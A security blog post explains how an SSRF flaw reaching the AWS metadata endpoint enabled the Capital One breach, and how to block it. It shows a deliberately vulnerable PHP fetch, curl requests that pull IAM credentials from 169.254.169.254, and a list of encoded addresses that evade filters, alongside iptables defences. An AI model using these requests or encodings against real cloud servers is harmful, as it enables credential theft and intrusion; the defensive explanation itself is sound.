Title: AWS Metadata Endpoint - How to not get pwned like Capital One

One of the greatest, yet seemingly unknown, dangers that face any cloud-based application is the deadly combination of an SSRF vulnerability and the AWS Metadata endpoint. As this write up from Brian Krebbs explains, the breach at Capital One was caused by an SSRF vulnerability that was able to reach the AWS Metadata endpoint and extract the temporary security credentials associated with the EC2 instance's IAM Role. These credentials enabled the attacker to access other other Capital One assets in the cloud and the result was that over 100 million credit card applications were compromised. 

The purpose of this blog post is to explain the technical details of such a vulnerability and give some helpful suggestions for avoiding a similar situation in any organization. 

### The Vulnerabilities
In order to fully understand the impact of this cloud one-two punch it is necessary to break down the attack chain into its various components: SSRF and the AWS Metadata Endpoint. First, Server Side Request Forgery (SSRF) is a vulnerability that allows an attacker to control the destination address of an HTTP request sent from the vulnerable server. While this is not always the case (see Blind SSRF), the attacker can often see the response from the request as well. This allows the attacker to use the vulnerable server as a proxy for HTTP requests which can result in the exposure sensative subnets and services. 

Consider the following PHP code:
```
<?php
echo file_get_contents("http://".$_GET['hostname']."/configureIntegration.php");
?>
```

The code above sends an HTTP request to the hostname specified by the attacker in the "hostname" GET parameter. Logic like this is commonly found in the "Integrations" section of applications. This code is vulnerable to SSRF. Consider the following scenario: 
There is a sensative service running on the localhost NIC of the vulnerable server. This is emulated by the following configuration:
[Picture of Setup Sensitive Service]

The PHP code above is hosted on the webserver that faces the internet. When an attacker discoveres this endpoint, he/she might use the following to grab the data from the internal application:
```
curl http://vulnerableserver.com/ssrf.php?hostname=localhost:8081/secret.html?
```
Which would result in a hit on the internal HTTP server:
```
┬─[justin@parrot:/t/secret]─[02:29:48 PM]
╰─>$ python3 -m http.server 8081 --bind 127.0.0.1                                           
Serving HTTP on 127.0.0.1 port 8081 (http://127.0.0.1:8081/) ...                                                         
127.0.0.1 - - [15/Aug/2019 14:30:56] "GET /secret.html?/configureIntegration.php HTTP/1.0" 200 -                     
```
and return the following to the attacker:
```
This is only available on a local NIC
```

Now that the danger of SSRF is clear, let's look at how this vulnerability may be exploited in the context of the Cloud (AWS in particular). 

Due to the dynamic nature of the Cloud, it became necessary that server instances (EC2 for example) have some way to get some basic information about their configuration for the purpose of orienting themselves to the environment in which they were spun up. Out of this need the AWS Metadata endpoint was born. This endpoint (169.254.169.254), when hit from any EC2 instance, will reveal information about the configuration of the particular EC2 instance. There is quite a lot of information available via this endpoint including: hostname, external ip address, metrics, lan information, security groups, and last but not least, the IAM (Identity and Access Management) credentials associated with this EC2 instance. It is possible to retrieve these security credentials by hitting the following url where [ROLE] is the IAM role name:
```
ec2-user@kali:~$ curl 169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]                                                                 
{
  "Code" : "Success",
  "LastUpdated" : "2019-08-15T18:13:44Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAN0P3n0W4y1nv4L1d",
  "SecretAccessKey" : "A5tGuw2QXjmqu8cTEu1zs0Dw8yt905HDCzrF0AdE",
  "Token" : "AgoJb3JpZ2luX2VjEJv//////////wEaCXVzLWVhc3QtMSJHMEUCIEX46oh4kz6AtBiTfvoHGqfVuHJI29ryAZy/wXyR51SAiEA04Pyw9HSwSIRNx6vmYpqm7sD+DkLQiFzajuwI2aLEp4q8gMIMxABGgwzNjY4OTY1NTU5NDkiDOBEJDdUKxKUkgkhGyrPA7u8oSds5hcIM0EeoHvgxvCX/ChiDsuCEFO1ctMpOgaQuunsvKLzuaTp/86V96iZzuoPLnpHHsmIUTrCcwwGqFzyaqvJpsFWdv89YIhARAMlcQ1Cc9Cs4pTBSYc/BvbEFb1z0xWqPlBNVKLMzm2K5409f/KCK/eJsxp530Zt7a1MEBp/rvceyiA5gg+6hOu65Um+4BNT+CjlEk3gwL6JUUWr9a2LKYxmyR4fc7XtLD2zB0jwdnG+EPv7aDPj7EoWMUoR/dOQav/oSHi7bl6+kT+koKzwhU/Q286qsk0kXMfG/U95TdUr70I3b/L/dhyaudpLENSU7uvPFi8qGVGpnCuZCvGL2JVSnzf8327jyuiTF7GvXlvUTh8bjxnZ8pAhqyyuxEW1tosL2NuqRHmlCCfnE3wLXJ0yBUr7uxMHTfL1gueEWghymIGhAxiYIKA9PPiHCDrn4gl5AGmLyzqxenZgcNnuwMjeTnhQ0mVf7L8PR4ZWRo9h3C1wMbYnYNi5rdfQcByMIN/XoR2J74sBPor/aObMMHVnmpNjbtRgKh0Vpi48VgXhXfuCAHka3rbYeOBYC8z8nUWYJKuxv3Nj0cQxXDnYT6LPPXmtHgZaBSUwxMHW6gU6tAHi8OEjskLZG81wLq1DiLbdPJilNrv5RPn3bBF+QkkB+URAQ8NBZA/z8mNnDfvESS44fMGFsfTIvIdANcihZQLo6VYvECV8Vw/QaLP/GbljKPwztRC5HSPe6WrC06LZS9yeTpVGZ6jFIn1O/01hJOgEwsK7+DDwcXtE5qtOynmOJiY/iUjcz79LWh184My58ueCNxJuzIM9Tbn0sH3l1eBxECTihDNbL13v5g+8ENaih+f3rNU=",
  "Expiration" : "2019-08-16T00:33:31Z"
}
```

The response contains several things: the AccessKeyId, SecretAccessKey, and the Token for this account. Using these credentials, an attacker can login to AWS and compromise the server and potentially many other assets. In the case of the Capital One breach, these credentials were used to access and S3 bucket which contained millions of records of user information. 

In summary, the poor implementation of the metadata service in AWS allows for an attacker to easily escalate an SSRF vulnerability to control of many different cloud assets. Other cloud providers like Google Cloud and Microsoft Azure also provide access to a metadata service endpoint but requests to these endpoints require a special header. This prevents most SSRF vulnerabilities from accessing the sensitive data there.

### How to prevent such a vulnerability
In order to prevent this type of vulnerability from occuring firewall rules will need to be put in place to block off the metadata endpoint. This can be done using the following iptables rule:
```
sudo iptables -A OUTPUT -d 169.254.169.254 -j DROP 
```
This will prevent any access to this ip address. However, if access to the metadata endpoint is required, it is also possible to exclude certain users from this rule. For example, the iptables rule below would allow only the root user to access the metadata endpoint:
```
sudo iptables -A OUTPUT -m owner ! --uid-owner root -d 169.254.169.254 -j DROP
```

These blocks MUST be done at the network level - not the application level. There are too many ways to access this IP address. For example, all of these addresses below refer to the metadata service:
```
http://[::ffff:169.254.169.254]
http://[0:0:0:0:0:ffff:169.254.169.254]
http://425.510.425.510/ Dotted decimal with overflow
http://2852039166/ Dotless decimal
http://7147006462/ Dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
http://0xA9FEA9FE/ Dotless hexadecimal
http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
http://0251.0376.0251.0376/ Dotted octal
http://0251.00376.000251.0000376/ Dotted octal with padding
http://169.254.169.254.xip.io/ DNS Name
http://A.8.8.8.8.1time.169.254.169.254.1time.repeat.rebind.network/ DNS Rebinding (8.8.8.8 -> AWS Metadata)
```

And there are many more. The only reliable way to address this issue is through a network level block of this IP.

The easiest way to check the IAM roles associated with each EC2 instance is to navigate to the EC2 Dashboard in AWS and add the column "IAM Instance Profile Name" by clicking the gear in the top right hand corner. Once the IAM role for each EC2 instance is easily visible, it is possible to check these roles to see if they are overly permissive for the what is required of that EC2 instance. 
[EC2 Dashboard Picture]

It is also imperative to understand the pivoting potential of these IAM Roles. If it is possible that an SSRF, XXE, or RCE vulnerability was exploited on any cloud system, the logs for the IAM Role associated with this instance must be thoroughly audited for malicious intent. 


 

